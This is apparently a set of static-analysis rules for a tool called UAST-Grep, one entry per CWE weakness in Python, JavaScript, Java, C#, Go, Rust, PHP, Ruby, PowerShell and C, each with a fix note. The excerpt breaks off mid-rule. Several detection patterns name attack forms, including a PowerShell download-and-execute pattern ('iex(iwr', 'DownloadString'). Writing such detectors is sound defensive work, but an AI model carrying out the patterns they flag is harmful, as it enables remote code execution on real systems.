# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                    UAST-Grep Universal Security Rules                        ║
# ║                  CWE-based detection patterns for 20+ languages              ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
#
# Generated: 2026-01-04
# Total Rules: 1,588
# CWE Coverage: 150+ unique CWE identifiers
# OWASP Coverage: All OWASP Top 10 categories mapped
#
# Languages: Python, JavaScript, TypeScript, Java, Go, Rust, C#, PowerShell,
#            Shell/Bash, C/C++, Ruby, Kotlin, Scala, Lua, Clojure, PHP, Swift,
#            Objective-C, Infrastructure (Docker/K8s/Terraform), Frameworks
#            (React, Angular, Vue, Django, Spring, Rails)
# ==============================================================================

id: python-cwe-89-sql-injection-execute
language: python
severity: error
message: 'CWE-89: SQL Injection - string concatenation in execute()'
tags:
- security
- injection
- CWE-89
- OWASP-A03
rule:
  kind: call
  pattern: $CURSOR.execute($QUERY)
  has:
    kind: binary_operator
    pattern: $LEFT + $RIGHT
note: 'SQL injection via string concatenation in execute().

  Use parameterized queries: cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

  '
---
id: python-cwe-89-sql-injection-format
language: python
severity: error
message: 'CWE-89: SQL Injection - f-string or format() in SQL query'
tags:
- security
- injection
- CWE-89
- OWASP-A03
rule:
  any:
  - pattern: $CURSOR.execute(f"$$$")
  - pattern: $CURSOR.execute("$$$".format($$$))
  - pattern: $CURSOR.execute("$$$" % $$$)
note: 'SQL injection via string formatting. Never use f-strings, format(), or % with
  SQL.

  Use parameterized queries with placeholder syntax.

  '
---
id: python-cwe-78-command-injection-os
language: python
severity: error
message: 'CWE-78: OS Command Injection via os.system or os.popen'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  kind: call
  has:
    any:
    - pattern: os.system
    - pattern: os.popen
    - pattern: os.spawn
    - pattern: os.spawnl
    - pattern: os.spawnle
    - pattern: os.spawnlp
    - pattern: os.spawnlpe
    - pattern: os.spawnv
    - pattern: os.spawnve
    - pattern: os.spawnvp
    - pattern: os.spawnvpe
note: 'os.system and os.popen execute commands in a shell, enabling injection.

  Use subprocess.run with shell=False and a list of arguments instead.

  '
---
id: python-cwe-78-subprocess-shell-true
language: python
severity: error
message: 'CWE-78: Command Injection via subprocess with shell=True'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  kind: call
  all:
  - has:
      any:
      - pattern: subprocess.call
      - pattern: subprocess.run
      - pattern: subprocess.Popen
      - pattern: subprocess.check_call
      - pattern: subprocess.check_output
  - has:
      pattern: shell=True
note: 'subprocess with shell=True passes commands through the shell.

  Use shell=False with arguments as a list: subprocess.run(["cmd", "arg1", "arg2"])

  '
---
id: python-cwe-94-code-injection-eval
language: python
severity: error
message: 'CWE-94: Code Injection via eval(), exec(), or compile()'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  kind: call
  has:
    any:
    - pattern: eval
    - pattern: exec
    - pattern: compile
note: 'eval(), exec(), and compile() execute arbitrary Python code.

  Use ast.literal_eval() for safe literal evaluation, or avoid dynamic code entirely.

  '
---
id: python-cwe-502-pickle-deserialization
language: python
severity: error
message: 'CWE-502: Deserialization of Untrusted Data via pickle'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: call
  has:
    any:
    - pattern: pickle.load
    - pattern: pickle.loads
    - pattern: cPickle.load
    - pattern: cPickle.loads
    - pattern: _pickle.load
    - pattern: _pickle.loads
note: 'Pickle deserialization can execute arbitrary code via __reduce__.

  Use JSON, or implement a custom restricted unpickler with find_class filtering.

  '
---
id: python-cwe-502-yaml-unsafe
language: python
severity: error
message: 'CWE-502: Unsafe YAML deserialization'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: call
  has:
    any:
    - pattern: yaml.load
    - pattern: yaml.unsafe_load
    - pattern: yaml.full_load
  not:
    has:
      pattern: Loader=yaml.SafeLoader
note: 'yaml.load() without SafeLoader can execute arbitrary Python code.

  Always use yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader).

  '
---
id: python-cwe-79-xss-flask-render-template-string
language: python
severity: error
message: 'CWE-79/CWE-1336: Server-Side Template Injection in Flask'
tags:
- security
- injection
- xss
- CWE-79
- CWE-1336
- flask
rule:
  kind: call
  has:
    pattern: render_template_string
note: 'render_template_string with user input leads to SSTI and arbitrary code execution.

  Use render_template() with pre-defined template files and auto-escaping.

  '
---
id: python-cwe-79-xss-django-mark-safe
language: python
severity: warning
message: 'CWE-79: XSS via Django mark_safe() or SafeString'
tags:
- security
- xss
- CWE-79
- OWASP-A03
- django
rule:
  kind: call
  has:
    any:
    - pattern: mark_safe
    - pattern: SafeString
    - pattern: SafeText
note: 'mark_safe() bypasses Django''s HTML auto-escaping.

  Only use with content you have sanitized; never with user input.

  '
---
id: python-cwe-295-ssl-verify-false
language: python
severity: error
message: 'CWE-295: Improper Certificate Validation - verify=False'
tags:
- security
- network
- CWE-295
- OWASP-A07
rule:
  any:
  - pattern: verify=False
  - pattern: verify = False
note: 'Disabling SSL certificate verification allows man-in-the-middle attacks.

  Remove verify=False in production code.

  '
---
id: python-cwe-327-weak-hash-hashlib
language: python
severity: error
message: 'CWE-327/CWE-328: Use of Broken Cryptographic Hash (MD5/SHA1)'
tags:
- security
- crypto
- CWE-327
- CWE-328
- OWASP-A02
rule:
  kind: call
  has:
    any:
    - pattern: hashlib.md5
    - pattern: hashlib.sha1
    - pattern: md5(
    - pattern: sha1(
note: 'MD5 and SHA1 have known collision attacks. Do not use for security.

  Use hashlib.sha256() or hashlib.sha3_256() for cryptographic hashing.

  '
---
id: python-cwe-338-weak-random
language: python
severity: warning
message: 'CWE-338: Use of Cryptographically Weak PRNG'
tags:
- security
- crypto
- CWE-338
rule:
  kind: call
  has:
    any:
    - pattern: random.random
    - pattern: random.randint
    - pattern: random.choice
    - pattern: random.randrange
    - pattern: random.sample
    - pattern: random.shuffle
note: 'The random module is not cryptographically secure.

  Use secrets module: secrets.token_bytes(), secrets.choice(), secrets.randbelow().

  '
---
id: python-cwe-798-hardcoded-password
language: python
severity: error
message: 'CWE-798: Hardcoded Password or Secret'
tags:
- security
- credentials
- CWE-798
- OWASP-A07
rule:
  kind: assignment
  pattern: $VAR = $VALUE
  where:
    VAR:
      regex: (?i)(password|passwd|pwd|secret|api_key|apikey|token|auth|private_key|secret_key|access_key|credentials)
    VALUE:
      kind: string
note: 'Hardcoded credentials in source code are a security risk.

  Use environment variables, secret managers, or configuration files excluded from
  VCS.

  '
---
id: python-cwe-22-path-traversal
language: python
severity: error
message: 'CWE-22: Path Traversal - unsanitized path construction'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: call
  has:
    any:
    - pattern: open($PATH)
    - pattern: os.path.join
    - pattern: pathlib.Path
  where:
    PATH:
      not:
        pattern: os.path.basename
note: 'User input in file paths can lead to path traversal attacks.

  Validate and sanitize paths; use os.path.basename() to strip directory components.

  '
---
id: javascript-cwe-94-eval
language: javascript
severity: error
message: 'CWE-94: Code Injection via eval()'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  kind: call_expression
  has:
    kind: identifier
    pattern: eval
note: 'eval() executes arbitrary JavaScript code and is a code injection vector.

  Use JSON.parse() for JSON, or safer alternatives like Function constructor with
  validation.

  '
---
id: javascript-cwe-94-function-constructor
language: javascript
severity: error
message: 'CWE-94: Code Injection via Function constructor'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  kind: new_expression
  has:
    kind: identifier
    pattern: Function
note: 'new Function() is essentially eval() and can execute arbitrary code.

  Avoid using Function constructor with any user-controlled input.

  '
---
id: javascript-cwe-79-innerhtml
language: javascript
severity: error
message: 'CWE-79: XSS via innerHTML/outerHTML assignment'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: assignment_expression
  has:
    kind: member_expression
    pattern: $ELEMENT.innerHTML
note: 'Setting innerHTML with untrusted data enables XSS attacks.

  Use textContent for text, or sanitize HTML with DOMPurify before insertion.

  '
---
id: javascript-cwe-79-document-write
language: javascript
severity: error
message: 'CWE-79: XSS via document.write()'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: call_expression
  has:
    any:
    - pattern: document.write
    - pattern: document.writeln
note: 'document.write() can introduce XSS vulnerabilities.

  Use DOM manipulation methods (createElement, appendChild) instead.

  '
---
id: javascript-cwe-78-child-process-exec
language: javascript
severity: error
message: 'CWE-78: Command Injection via child_process exec/execSync'
tags:
- security
- injection
- CWE-78
- OWASP-A03
- nodejs
rule:
  kind: call_expression
  has:
    any:
    - pattern: exec(
    - pattern: execSync(
    - pattern: require('child_process').exec
    - pattern: require("child_process").exec
note: 'exec/execSync pass commands through a shell, enabling injection.

  Use execFile/spawn with shell:false and arguments as an array.

  '
---
id: javascript-cwe-1321-prototype-pollution
language: javascript
severity: error
message: 'CWE-1321: Prototype Pollution via __proto__ or constructor.prototype'
tags:
- security
- injection
- CWE-1321
- OWASP-A03
rule:
  any:
  - pattern: __proto__
  - pattern: constructor.prototype
  - pattern: Object.prototype
note: 'Prototype pollution can modify Object.prototype and affect all objects.

  Freeze prototypes, use Object.create(null), or validate object keys.

  '
---
id: javascript-cwe-614-insecure-cookie
language: javascript
severity: warning
message: 'CWE-614: Missing Secure Flag on Cookie'
tags:
- security
- session
- CWE-614
- OWASP-A07
rule:
  kind: assignment_expression
  has:
    pattern: document.cookie
  not:
    has:
      pattern: Secure
note: 'Cookies without the Secure flag can be transmitted over unencrypted connections.

  Set cookies with: document.cookie = "name=value; Secure; HttpOnly; SameSite=Strict"

  '
---
id: javascript-cwe-922-localstorage-sensitive
language: javascript
severity: warning
message: 'CWE-922: Insecure Storage of Sensitive Information in localStorage'
tags:
- security
- storage
- CWE-922
- OWASP-A02
rule:
  kind: call_expression
  has:
    any:
    - pattern: localStorage.setItem
    - pattern: sessionStorage.setItem
note: 'localStorage/sessionStorage are accessible via JavaScript and vulnerable to
  XSS.

  Use httpOnly cookies for tokens; encrypt sensitive data if storage is required.

  '
---
id: javascript-cwe-601-open-redirect
language: javascript
severity: warning
message: 'CWE-601: Open Redirect via location assignment'
tags:
- security
- redirect
- CWE-601
- OWASP-A01
rule:
  kind: assignment_expression
  has:
    any:
    - pattern: window.location
    - pattern: location.href
    - pattern: location.replace
note: 'Assigning user input to location enables open redirect attacks.

  Validate redirect URLs against an allowlist of trusted domains.

  '
---
id: typescript-cwe-94-eval
language: typescript
severity: error
message: 'CWE-94: Code Injection via eval() in TypeScript'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  kind: call_expression
  has:
    kind: identifier
    pattern: eval
note: 'eval() executes arbitrary code. TypeScript type safety does not prevent eval
  injection.

  Use JSON.parse() for data, avoid dynamic code execution entirely.

  '
---
id: javascript-cwe-502-json-parse-constructor
language: javascript
severity: warning
message: 'CWE-502: Potential Object Injection via JSON.parse'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: call_expression
  has:
    kind: member_expression
    pattern: $OBJ.constructor
note: 'JSON.parse can create objects with __proto__ or constructor properties.

  Use a reviver function to filter dangerous keys: JSON.parse(data, reviver).

  '
---
id: java-cwe-89-sql-injection-statement
language: java
severity: error
message: 'CWE-89: SQL Injection via Statement.execute with string concatenation'
tags:
- security
- injection
- CWE-89
- OWASP-A03
rule:
  kind: method_invocation
  has:
    any:
    - pattern: Statement.executeQuery
    - pattern: Statement.executeUpdate
    - pattern: Statement.execute
    - pattern: createStatement().execute
note: 'Using Statement with string concatenation enables SQL injection.

  Use PreparedStatement with parameterized queries:

  PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");

  ps.setInt(1, userId);

  '
---
id: java-cwe-89-sql-injection-jpa
language: java
severity: error
message: 'CWE-89: SQL Injection via JPA/Hibernate native query'
tags:
- security
- injection
- CWE-89
- OWASP-A03
- hibernate
rule:
  kind: method_invocation
  has:
    kind: binary_expression
    pattern: $LEFT + $RIGHT
note: 'String concatenation in JPA/Hibernate queries leads to SQL injection.

  Use named parameters: createQuery("SELECT u FROM User u WHERE u.id = :id").setParameter("id",
  id)

  '
---
id: java-cwe-78-runtime-exec
language: java
severity: error
message: 'CWE-78: OS Command Injection via Runtime.exec()'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  kind: method_invocation
  has:
    any:
    - pattern: Runtime.exec
    - pattern: Runtime.getRuntime().exec
    - pattern: ProcessBuilder
note: 'Runtime.exec() and ProcessBuilder can execute arbitrary commands.

  Validate and sanitize all inputs; use allowlists for permitted commands.

  '
---
id: java-cwe-502-object-deserialization
language: java
severity: error
message: 'CWE-502: Deserialization of Untrusted Data via ObjectInputStream'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: method_invocation
  has:
    any:
    - pattern: ObjectInputStream
    - pattern: readObject
    - pattern: readUnshared
note: 'Java deserialization of untrusted data can execute arbitrary code.

  Use allowlists with ObjectInputFilter, or switch to JSON/Protocol Buffers.

  '
---
id: java-cwe-502-xmldecoder
language: java
severity: error
message: 'CWE-502: XMLDecoder deserialization vulnerability'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: object_creation_expression
  has:
    pattern: XMLDecoder
note: 'XMLDecoder can instantiate arbitrary objects and execute code.

  Use safer XML parsers like JAXB with known types, or JSON.

  '
---
id: java-cwe-611-xxe-documentbuilder
language: java
severity: error
message: 'CWE-611: XXE via DocumentBuilderFactory without secure configuration'
tags:
- security
- xxe
- CWE-611
- OWASP-A05
rule:
  kind: method_invocation
  has:
    any:
    - pattern: DocumentBuilderFactory.newInstance
    - pattern: SAXParserFactory.newInstance
    - pattern: XMLInputFactory.newInstance
    - pattern: TransformerFactory.newInstance
    - pattern: SchemaFactory.newInstance
note: "Java XML parsers are vulnerable to XXE by default.\nDisable external entities:\n\
  \  factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n  factory.setFeature(\"\
  http://apache.org/xml/features/disallow-doctype-decl\", true);\n"
---
id: java-cwe-917-spel-injection
language: java
severity: error
message: 'CWE-917: Spring Expression Language (SpEL) Injection'
tags:
- security
- injection
- CWE-917
- OWASP-A03
- spring
rule:
  kind: method_invocation
  has:
    any:
    - pattern: SpelExpressionParser
    - pattern: Expression.getValue
    - pattern: parseExpression
note: 'SpEL expressions with user input can execute arbitrary code.

  Use SimpleEvaluationContext which restricts expression capabilities.

  '
---
id: java-cwe-74-jndi-injection
language: java
severity: error
message: 'CWE-74: JNDI Injection (Log4Shell-type vulnerability)'
tags:
- security
- injection
- CWE-74
- OWASP-A03
rule:
  kind: method_invocation
  has:
    any:
    - pattern: InitialContext.lookup
    - pattern: Context.lookup
    - pattern: NamingContext.lookup
note: 'JNDI lookups with user-controlled input can load remote code (Log4Shell).

  Validate JNDI names against an allowlist; disable remote lookups.

  '
---
id: java-cwe-327-weak-cipher
language: java
severity: error
message: 'CWE-327: Use of Broken Cryptographic Algorithm (DES/3DES/RC4)'
tags:
- security
- crypto
- CWE-327
- OWASP-A02
rule:
  kind: method_invocation
  has:
    any:
    - pattern: '"DES"'
    - pattern: '"DESede"'
    - pattern: '"RC4"'
    - pattern: '"RC2"'
    - pattern: '"Blowfish"'
    - pattern: '"/ECB/"'
note: 'DES, 3DES, RC4, RC2, and Blowfish are weak or broken. ECB mode leaks patterns.

  Use Cipher.getInstance("AES/GCM/NoPadding") with 256-bit keys.

  '
---
id: java-cwe-295-ssl-trust-all
language: java
severity: error
message: 'CWE-295: Improper Certificate Validation - Trust All Certificates'
tags:
- security
- network
- CWE-295
- OWASP-A07
rule:
  any:
  - pattern: TrustAllCertificates
  - pattern: X509TrustManager
  - pattern: checkServerTrusted
  - pattern: ALLOW_ALL_HOSTNAME_VERIFIER
note: 'Custom TrustManagers that accept all certificates enable MITM attacks.

  Use default TrustManager with proper CA certificates.

  '
---
id: csharp-cwe-89-sql-injection-raw
language: csharp
severity: error
message: 'CWE-89: SQL Injection via raw SQL or string concatenation'
tags:
- security
- injection
- CWE-89
- OWASP-A03
rule:
  kind: invocation_expression
  has:
    kind: binary_expression
    pattern: $LEFT + $RIGHT
note: 'FromSqlRaw/ExecuteSqlRaw with string concatenation enables SQL injection.

  Use FromSqlInterpolated() or parameterized queries with SqlParameter.

  '
---
id: csharp-cwe-78-process-start
language: csharp
severity: warning
message: 'CWE-78: OS Command Injection via Process.Start()'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  kind: invocation_expression
  has:
    any:
    - pattern: Process.Start
    - pattern: ProcessStartInfo
note: 'Process.Start with user input can execute arbitrary commands.

  Validate all arguments; set UseShellExecute = false and escape inputs.

  '
---
id: csharp-cwe-502-binaryformatter
language: csharp
severity: error
message: 'CWE-502: BinaryFormatter deserialization vulnerability (deprecated)'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  any:
  - pattern: BinaryFormatter
  - pattern: new BinaryFormatter()
  - pattern: BinaryFormatter.Deserialize
note: 'BinaryFormatter is insecure and deprecated by Microsoft (SYSLIB0011).

  Migrate to System.Text.Json or DataContractSerializer with known types.

  '
---
id: csharp-cwe-502-unsafe-serializers
language: csharp
severity: error
message: 'CWE-502: Insecure .NET Serializer'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  any:
  - pattern: NetDataContractSerializer
  - pattern: SoapFormatter
  - pattern: LosFormatter
  - pattern: ObjectStateFormatter
  - pattern: JavaScriptSerializer
note: 'These serializers can deserialize arbitrary types and execute code.

  Use System.Text.Json or DataContractSerializer with known types only.

  '
---
id: csharp-cwe-611-xxe-xmldocument
language: csharp
severity: error
message: 'CWE-611: XXE via XmlDocument without secure settings'
tags:
- security
- xxe
- CWE-611
- OWASP-A05
rule:
  kind: invocation_expression
  has:
    any:
    - pattern: XmlDocument.Load
    - pattern: XmlDocument.LoadXml
    - pattern: XmlTextReader
note: 'XmlDocument and XmlTextReader are vulnerable to XXE by default.

  Set XmlResolver = null, or use XmlReader.Create with secure XmlReaderSettings.

  '
---
id: csharp-cwe-119-unsafe-keyword
language: csharp
severity: warning
message: 'CWE-119: unsafe keyword bypasses memory safety'
tags:
- security
- memory
- CWE-119
- CWE-787
rule:
  any:
  - pattern: unsafe
  - pattern: fixed (
  - pattern: stackalloc
note: 'The unsafe keyword allows direct pointer manipulation without bounds checking.

  Ensure proper validation and use Span<T> when possible.

  '
---
id: csharp-cwe-798-hardcoded-connectionstring
language: csharp
severity: error
message: 'CWE-798: Hardcoded Connection String with Credentials'
tags:
- security
- credentials
- CWE-798
- OWASP-A07
rule:
  kind: assignment_expression
  pattern: $VAR = $VALUE
  where:
    VAR:
      regex: (?i)(connectionstring|connstring|connection)
    VALUE:
      kind: string_literal
      regex: (?i)(password|pwd|user id|uid)=
note: 'Hardcoded connection strings expose database credentials.

  Use configuration files, Azure Key Vault, or Windows Credential Manager.

  '
---
id: go-cwe-89-sql-injection
language: go
severity: error
message: 'CWE-89: SQL Injection via string formatting in Query/Exec'
tags:
- security
- injection
- CWE-89
- OWASP-A03
rule:
  kind: call_expression
  has:
    any:
    - pattern: fmt.Sprintf
    - kind: binary_expression
      pattern: $LEFT + $RIGHT
note: 'String concatenation/formatting in SQL queries enables injection.

  Use parameterized queries: db.Query("SELECT * FROM users WHERE id = $1", userID)

  '
---
id: go-cwe-78-command-injection
language: go
severity: warning
message: 'CWE-78: Command Injection via exec.Command'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  kind: call_expression
  has:
    any:
    - pattern: exec.Command
    - pattern: exec.CommandContext
note: 'exec.Command with user input can execute arbitrary commands.

  Validate inputs; avoid shell interpretation by not using /bin/sh -c.

  '
---
id: go-cwe-94-template-injection
language: go
severity: warning
message: 'CWE-94: Template Injection via html/template bypass'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  kind: call_expression
  has:
    any:
    - pattern: template.HTML
    - pattern: template.JS
    - pattern: template.CSS
    - pattern: template.URL
    - pattern: template.Srcset
note: 'These template types bypass html/template''s auto-escaping.

  Only use with content you have sanitized; never with user input.

  '
---
id: go-cwe-295-insecure-skip-verify
language: go
severity: error
message: 'CWE-295: TLS Certificate Validation Disabled'
tags:
- security
- network
- CWE-295
- OWASP-A07
rule:
  any:
  - pattern: 'InsecureSkipVerify: true'
  - pattern: InsecureSkipVerify:true
note: 'InsecureSkipVerify=true disables TLS certificate validation (MITM risk).

  Use proper certificate validation in production.

  '
---
id: go-cwe-338-weak-random
language: go
severity: warning
message: 'CWE-338: math/rand is not cryptographically secure'
tags:
- security
- crypto
- CWE-338
rule:
  kind: call_expression
  has:
    any:
    - pattern: rand.Intn
    - pattern: rand.Int
    - pattern: rand.Float64
    - pattern: rand.Read
note: 'math/rand is predictable and unsuitable for security purposes.

  Use crypto/rand.Read() or crypto/rand.Int() for cryptographic randomness.

  '
---
id: go-cwe-119-unsafe-pointer
language: go
severity: warning
message: 'CWE-119: unsafe.Pointer bypasses Go''s type safety'
tags:
- security
- memory
- CWE-119
rule:
  any:
  - pattern: unsafe.Pointer
  - pattern: unsafe.Sizeof
  - pattern: unsafe.Offsetof
  - pattern: unsafe.Alignof
  - pattern: unsafe.Add
  - pattern: unsafe.Slice
note: 'The unsafe package bypasses Go''s memory safety guarantees.

  Minimize usage and document invariants carefully.

  '
---
id: rust-cwe-119-unsafe-block
language: rust
severity: warning
message: 'CWE-119: unsafe block bypasses Rust''s memory safety'
tags:
- security
- memory
- CWE-119
- CWE-787
rule:
  any:
  - pattern: unsafe {
  - pattern: unsafe fn
  - pattern: unsafe impl
note: 'unsafe blocks can introduce memory corruption vulnerabilities.

  Minimize unsafe usage; document safety invariants with SAFETY comments.

  '
---
id: rust-cwe-843-transmute
language: rust
severity: error
message: 'CWE-843: std::mem::transmute can cause undefined behavior'
tags:
- security
- memory
- CWE-843
- CWE-704
rule:
  pattern: transmute
note: 'transmute reinterprets bits between types, risking undefined behavior.

  Prefer From/Into traits, or use transmute_copy with proper alignment checks.

  '
---
id: rust-cwe-78-command-injection
language: rust
severity: warning
message: 'CWE-78: Command Injection via std::process::Command'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  any:
  - pattern: Command::new
  - pattern: process::Command
note: 'User input in Command::new() can lead to command injection.

  Validate inputs and use .arg() method for arguments (not shell expansion).

  '
---
id: rust-cwe-295-danger-tls
language: rust
severity: error
message: 'CWE-295: TLS Certificate Validation Disabled'
tags:
- security
- network
- CWE-295
- OWASP-A07
rule:
  any:
  - pattern: danger_accept_invalid_certs
  - pattern: danger_accept_invalid_hostnames
note: 'Disabling TLS certificate validation enables man-in-the-middle attacks.

  Never use danger_accept_* in production code.

  '
---
id: php-cwe-89-sql-injection
language: php
severity: error
message: 'CWE-89: SQL Injection via string interpolation in query'
tags:
- security
- injection
- CWE-89
- OWASP-A03
rule:
  kind: function_call_expression
  has:
    kind: encapsed_string
note: 'String interpolation in SQL queries enables injection.

  Use prepared statements: $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");

  '
---
id: php-cwe-94-eval
language: php
severity: error
message: 'CWE-94: Code Injection via eval() or create_function()'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  kind: function_call_expression
  has:
    any:
    - pattern: eval
    - pattern: create_function
    - pattern: assert
    - pattern: preg_replace
note: 'eval(), create_function(), and assert() can execute arbitrary PHP code.

  preg_replace with /e modifier also evaluates code. Never use with user input.

  '
---
id: php-cwe-502-unserialize
language: php
severity: error
message: 'CWE-502: Insecure Deserialization via unserialize()'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: function_call_expression
  has:
    pattern: unserialize
note: 'unserialize() of untrusted data can instantiate arbitrary objects and execute
  code.

  Use json_decode() instead, or specify allowed_classes option.

  '
---
id: php-cwe-78-command-injection
language: php
severity: error
message: 'CWE-78: OS Command Injection via shell functions'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  kind: function_call_expression
  has:
    any:
    - pattern: shell_exec
    - pattern: exec
    - pattern: system
    - pattern: passthru
    - pattern: popen
    - pattern: proc_open
    - pattern: pcntl_exec
note: 'Shell execution functions with user input enable command injection.

  Use escapeshellarg() and escapeshellcmd(); prefer built-in PHP functions.

  '
---
id: php-cwe-98-lfi-rfi
language: php
severity: error
message: 'CWE-98: Local/Remote File Inclusion'
tags:
- security
- injection
- CWE-98
- CWE-22
- OWASP-A03
rule:
  kind: include_expression
  has:
    kind: variable_name
note: 'include/require with user-controlled paths leads to LFI/RFI.

  Use a whitelist of allowed files; validate and sanitize file paths.

  '
---
id: php-cwe-79-xss-echo
language: php
severity: warning
message: 'CWE-79: XSS via echo/print without encoding'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: echo_statement
  has:
    kind: variable_name
note: 'Echoing user input without encoding enables XSS.

  Use htmlspecialchars($var, ENT_QUOTES, ''UTF-8'') for HTML output.

  '
---
id: php-cwe-915-extract
language: php
severity: warning
message: 'CWE-915: Mass Assignment via extract()'
tags:
- security
- injection
- CWE-915
rule:
  kind: function_call_expression
  has:
    pattern: extract
note: 'extract() imports array keys as variables, enabling variable overwrite attacks.

  Access array elements directly; if extract is needed, use EXTR_SKIP flag.

  '
---
id: ruby-cwe-502-marshal-load
language: ruby
severity: error
message: 'CWE-502: Insecure Deserialization via Marshal.load'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: call
  has:
    any:
    - pattern: Marshal.load
    - pattern: Marshal.restore
note: 'Marshal.load can execute arbitrary Ruby code via gadget chains.

  Use JSON.parse or YAML.safe_load for untrusted data.

  '
---
id: ruby-cwe-502-yaml-load
language: ruby
severity: error
message: 'CWE-502: Insecure YAML Deserialization'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: call
  has:
    any:
    - pattern: YAML.load
    - pattern: Psych.load
  not:
    has:
      any:
      - pattern: safe
      - pattern: permitted_classes
note: 'YAML.load can instantiate arbitrary objects and execute code.

  Use YAML.safe_load(data, permitted_classes: [...]) for untrusted input.

  '
---
id: ruby-cwe-94-eval
language: ruby
severity: error
message: 'CWE-94: Code Injection via Ruby eval methods'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  kind: call
  has:
    any:
    - pattern: eval
    - pattern: instance_eval
    - pattern: class_eval
    - pattern: module_eval
    - pattern: binding.eval
note: 'Ruby eval methods execute arbitrary code. Never use with user input.

  Use safer alternatives like JSON parsing or whitelisted method dispatch.

  '
---
id: ruby-cwe-78-system-backtick
language: ruby
severity: warning
message: 'CWE-78: Command Injection via system/backticks/exec'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  kind: call
  has:
    any:
    - pattern: system
    - pattern: exec
    - pattern: spawn
    - pattern: '`'
    - pattern: '%x'
note: 'system, exec, and backticks with user input enable command injection.

  Use array form: system("cmd", "arg1", "arg2") to avoid shell interpretation.

  '
---
id: ruby-cwe-79-html-safe
language: ruby
severity: warning
message: 'CWE-79: XSS via html_safe or raw in Rails'
tags:
- security
- xss
- CWE-79
- OWASP-A03
- rails
rule:
  kind: call
  has:
    any:
    - pattern: html_safe
    - pattern: raw
note: 'html_safe and raw bypass Rails'' auto-escaping, enabling XSS.

  Only use with content you have sanitized; never with user input.

  '
---
id: ruby-cwe-1336-erb-injection
language: ruby
severity: error
message: 'CWE-1336: Server-Side Template Injection via ERB.new'
tags:
- security
- injection
- CWE-1336
- OWASP-A03
rule:
  kind: call
  has:
    pattern: ERB.new
note: 'Creating ERB templates from user input leads to arbitrary code execution.

  Use pre-defined template files only.

  '
---
id: powershell-cwe-94-invoke-expression
language: powershell
severity: error
message: 'CWE-94: Code Injection via Invoke-Expression'
tags:
- security
- injection
- CWE-94
- OWASP-A03
rule:
  kind: command
  has:
    any:
    - pattern: Invoke-Expression
    - pattern: iex
note: 'Invoke-Expression (iex) executes strings as PowerShell code.

  Never use with user input or downloaded content. Use proper cmdlets instead.

  '
---
id: powershell-cwe-829-downloadstring-iex
language: powershell
severity: error
message: 'CWE-829: Download and Execute Pattern'
tags:
- security
- network
- CWE-829
- OWASP-A08
rule:
  any:
  - pattern: iex(iwr
  - pattern: iex (iwr
  - pattern: Invoke-Expression (Invoke-WebRequest
  - pattern: (New-Object Net.WebClient).DownloadString
note: 'Downloading and executing remote code is a common attack vector.

  Verify sources, check signatures, and audit content before execution.

  '
---
id: powershell-cwe-78-start-process
language: powershell
severity: warning
message: 'CWE-78: Command Injection via Start-Process'
tags:
- security
- injection
- CWE-78
- OWASP-A03
rule:
  kind: command
  has:
    pattern: Start-Process
note: 'Start-Process with user-controlled arguments can lead to command injection.

  Validate and sanitize all arguments; avoid -ArgumentList with unsanitized input.

  '
---
id: powershell-cwe-94-scriptblock-create
language: powershell
severity: warning
message: 'CWE-94: Dynamic Code via ScriptBlock::Create'
tags:
- security
- injection
- CWE-94
rule:
  pattern: '[ScriptBlock]::Create'
note: 'Creating scriptblocks from strings enables dynamic code execution.

  Avoid using with untrusted input; use static scriptblocks when possible.

  '
---
id: powershell-cwe-798-plaintext-credential
language: powershell
severity: error
message: 'CWE-798: Hardcoded Credential in ConvertTo-SecureString'
tags:
- security
- credentials
- CWE-798
- OWASP-A07
rule:
  any:
  - pattern: ConvertTo-SecureString -AsPlainText
  - pattern: New-Object PSCredential
note: 'Hardcoding passwords in scripts exposes credentials.

  Use Get-Credential, Windows Credential Manager, or Azure Key Vault.

  '
---
id: c-cwe-120-buffer-overflow-gets
language: c
severity: error
message: 'CWE-120: Buffer Overflow via gets()'
tags:
- security
- memory
- CWE-120
- CWE-119
rule:
  kind: call_expression
  has:
    kind: identifier
    pattern: gets
note: 'gets() has no bounds checking and is removed in C11.

  Use fgets(buffer, sizeof(buffer), stdin) instead.

  '
---
id: c-cwe-120-buffer-overflow-strcpy
language: c
severity: error
